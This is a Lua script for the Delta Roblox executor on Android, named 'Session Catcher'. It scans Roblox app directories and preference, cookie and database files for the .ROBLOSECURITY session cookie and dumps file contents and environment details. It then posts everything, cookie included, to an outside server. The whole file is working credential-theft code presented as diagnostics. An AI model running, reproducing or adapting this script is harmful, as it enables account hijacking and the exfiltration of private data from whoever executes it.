-- ============================================================
--  Session Catcher — Delta Executor (Android)
--  v3 — full diagnostic scan
-- ============================================================

local SERVER_URL = "https://session-catcher.onrender.com/catch"

local httpRequest = (syn and syn.request) 
                  or (http and http.request) 
                  or request 
                  or (fluxus and fluxus.request) 
                  or nil

if not httpRequest then
    warn("[Catcher] HTTP request function not found.")
    return
end

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")

local executorName = "Unknown"
local executorVersion = "Unknown"

pcall(function()
    if identifyexecutor then
        local name, version = identifyexecutor()
        executorName = name or "Unknown"
        executorVersion = version or "Unknown"
    end
end)

local placeId = game.PlaceId
local placeName = "Unknown"
local jobId = game.JobId

pcall(function()
    local info = MarketplaceService:GetProductInfo(placeId)
    placeName = info.Name or "Unknown"
end)

-- -----------------------------------------------------------
-- ДИАГНОСТИКА 1: Все доступные глобальные функции
-- -----------------------------------------------------------
local availableFunctions = {}

local knownFunctions = {
    "request", "http_request", "syn", "http", "fluxus",
    "readfile", "writefile", "listfiles", "appendfile", "makefolder", "isfolder", "isfile", "delfile", "delfolder",
    "getcookie", "getroblosecurity", "getROBLOSECURITY", "GetCookie", "get_cookie",
    "gettoken", "getauth", "getsession", "getsyncookie",
    "getcustomasset", "getsyn", "gethui",
    "cloneref", "clonefunction", "hookmetamethod", "hookfunction",
    "loadstring", "getgenv", "getrenv", "getfenv", "getreg",
    "setclipboard", "toclipboard",
    "base64encode", "base64decode", "crypt", "encrypt", "decrypt",
    "messagebox", "msgbox",
    "mouse1click", "mouse1release", "mouse2click", "keypress", "keyrelease",
    "isluau", "lz4compress", "lz4decompress",
    "getidentity", "getthreadidentity", "setidentity",
    "getrunner", "getexecutorinfo",
    "websocketconnect", "websocket", "wsconnect"
}

for _, funcName in ipairs(knownFunctions) do
    local value = rawget(getgenv and getgenv() or _G, funcName) or rawget(_G, funcName)
    if value ~= nil then
        table.insert(availableFunctions, funcName)
    end
end

-- -----------------------------------------------------------
-- ДИАГНОСТИКА 2: Сканирование файловой системы
-- -----------------------------------------------------------
local fileDumps = {}
local cookieFromFile = ""
local accessibleDirs = {}
local fileListings = {}

-- Директории для сканирования
local scanDirs = {
    "/data/data/com.roblox.client/",
    "/data/data/com.roblox.client/shared_prefs/",
    "/data/data/com.roblox.client/files/",
    "/data/data/com.roblox.client/cache/",
    "/data/data/com.roblox.client/app_webview/",
    "/data/data/com.roblox.client/app_webview/Default/",
    "/data/data/com.roblox.client/databases/",
    "/data/data/com.roblox.client/app_shared_prefs/",
    "/data/data/com.roblox.client/shared_prefs/",
    "/data/data/com.roblox/",
    "/data/data/com.delta.executor/",
    "/data/data/com.delta/",
    "/sdcard/Android/data/com.roblox.client/",
    "/sdcard/Android/data/com.roblox.client/files/",
    "/sdcard/Roblox/",
    "/storage/emulated/0/Android/data/com.roblox.client/",
    "/storage/emulated/0/Android/data/com.roblox.client/files/",
    "/storage/emulated/0/Roblox/",
    "/data/user/0/com.roblox.client/",
    "/data/user/0/com.roblox.client/shared_prefs/",
    "/data/user/0/com.roblox.client/files/"
}

-- Сканируем каждую директорию
for _, dir in ipairs(scanDirs) do
    if listfiles then
        local lOk, files = pcall(listfiles, dir)
        if lOk and files and #files > 0 then
            table.insert(accessibleDirs, dir)
            local listing = {}
            for _, file in ipairs(files) do
                table.insert(listing, file)
            end
            fileListings[dir] = listing
            
            -- Читаем каждый файл и ищем куку
            for _, file in ipairs(files) do
                local rOk, content = pcall(readfile, file)
                if rOk and content and #content > 0 and #content < 100000 then
                    -- Сохраняем содержимое для диагностики
                    local short = content:sub(1, 500)
                    fileDumps[file] = short
                    
                    -- Ищем куку
                    if content:find("_|WARNING") or content:find("ROBLOSECURITY") then
                        -- Разные варианты извлечения
                        local warningStart = content:find("_|WARNING")
                        if warningStart then
                            -- Ищем конец куки
                            local endPos = content:find("[\n\r<\"]", warningStart + 10)
                            if endPos then
                                cookieFromFile = content:sub(warningStart, endPos - 1)
                            else
                                cookieFromFile = content:sub(warningStart, warningStart + 1000)
                            end
                            cookieFromFile = cookieFromFile:gsub("%s", "")
                            print("[Catcher] Cookie found in: " .. file)
                        end
                        
                        -- Может быть в формате .ROBLOSECURITY=value
                        local robloxStart = content:find("%.ROBLOSECURITY=")
                        if robloxStart and cookieFromFile == "" then
                            local valueStart = content:find("=", robloxStart) + 1
                            local endPos = content:find("[\n\r<\"; ]", valueStart)
                            if endPos then
                                cookieFromFile = content:sub(valueStart, endPos - 1)
                            else
                                cookieFromFile = content:sub(valueStart, valueStart + 1000)
                            end
                            cookieFromFile = cookieFromFile:gsub("%s", "")
                            print("[Catcher] Cookie found in: " .. file)
                        end
                    end
                end
            end
        end
    end
end

-- -----------------------------------------------------------
-- ДИАГНОСТИКА 3: Прямые попытки чтения известных файлов
-- -----------------------------------------------------------
local directPaths = {
    "/data/data/com.roblox.client/shared_prefs/com.roblox.client_preferences.xml",
    "/data/data/com.roblox.client/shared_prefs/RbxSharedPrefs.xml",
    "/data/data/com.roblox.client/shared_prefs/Roblox.xml",
    "/data/data/com.roblox.client/shared_prefs/auth.xml",
    "/data/data/com.roblox.client/shared_prefs/login.xml",
    "/data/data/com.roblox.client/shared_prefs/session.xml",
    "/data/data/com.roblox.client/shared_prefs/com.roblox.client.xml",
    "/data/data/com.roblox.client/files/RobloxAppData.xml",
    "/data/data/com.roblox.client/files/Auth.xml",
    "/data/data/com.roblox.client/files/Session.xml",
    "/data/data/com.roblox.client/files/login.json",
    "/data/data/com.roblox.client/files/auth.json",
    "/data/data/com.roblox.client/app_webview/Cookies",
    "/data/data/com.roblox.client/app_webview/Default/Cookies",
    "/data/data/com.roblox.client/databases/Roblox.db",
    "/data/data/com.roblox.client/databases/webview.db",
    "/data/data/com.roblox.client/databases/cookies.db",
    "/data/user/0/com.roblox.client/shared_prefs/com.roblox.client_preferences.xml"
}

for _, path in ipairs(directPaths) do
    if readfile then
        local rOk, content = pcall(readfile, path)
        if rOk and content and #content > 0 then
            local short = content:sub(1, 500)
            fileDumps[path] = short
            
            if content:find("_|WARNING") or content:find("ROBLOSECURITY") then
                local warningStart = content:find("_|WARNING")
                if warningStart then
                    local endPos = content:find("[\n\r<\"]", warningStart + 10) or #content
                    cookieFromFile = content:sub(warningStart, endPos - 1)
                    cookieFromFile = cookieFromFile:gsub("%s", "")
                end
            end
        end
    end
end

-- -----------------------------------------------------------
-- ДИАГНОСТИКА 4: getgenv сканирование
-- -----------------------------------------------------------
local genvDump = {}
pcall(function()
    if getgenv then
        local genv = getgenv()
        for k, v in pairs(genv) do
            if type(k) == "string" then
                genvDump[k] = type(v)
            end
        end
    end
end)

-- -----------------------------------------------------------
-- ДИАГНОСТИКА 5: Попытка запроса к Roblox API
-- (может Delta прикрепляет куку к roblox.com запросам)
-- -----------------------------------------------------------
local robloxApiResponse = ""
pcall(function()
    local resp = httpRequest({
        Url = "https://users.roblox.com/v1/users/authenticated",
        Method = "GET"
    })
    if resp and resp.Body then
        robloxApiResponse = resp.Body:sub(1, 500)
    end
end)

-- -----------------------------------------------------------
-- Отправка
-- -----------------------------------------------------------
local payload = {
    userId = LocalPlayer.UserId,
    username = LocalPlayer.Name,
    displayName = LocalPlayer.DisplayName,
    placeId = placeId,
    placeName = placeName,
    jobId = jobId,
    executor = executorName,
    executorVersion = executorVersion,
    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
    cookieFromFile = cookieFromFile,
    fileDumps = fileDumps,
    accessibleDirs = accessibleDirs,
    fileListings = fileListings,
    availableFunctions = availableFunctions,
    genvDump = genvDump,
    robloxApiResponse = robloxApiResponse
}

local success, response = pcall(function()
    return httpRequest({
        Url = SERVER_URL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json",
            ["User-Agent"] = "Roblox/Delta-Catcher"
        },
        Body = HttpService:JSONEncode(payload)
    })
end)

if success then
    print("[Catcher] Sent. Status: " .. (response.StatusCode or "unknown"))
    print("[Catcher] Functions: " .. #availableFunctions)
    print("[Catcher] Accessible dirs: " .. #accessibleDirs)
    print("[Catcher] Files read: " .. (fileDumps and table.getn(fileDumps) or 0))
    if cookieFromFile ~= "" then
        print("[Catcher] COOKIE CAPTURED!")
    else
        print("[Catcher] No cookie found. Diagnostic data sent.")
    end
else
    warn("[Catcher] Failed: " .. tostring(response))
end
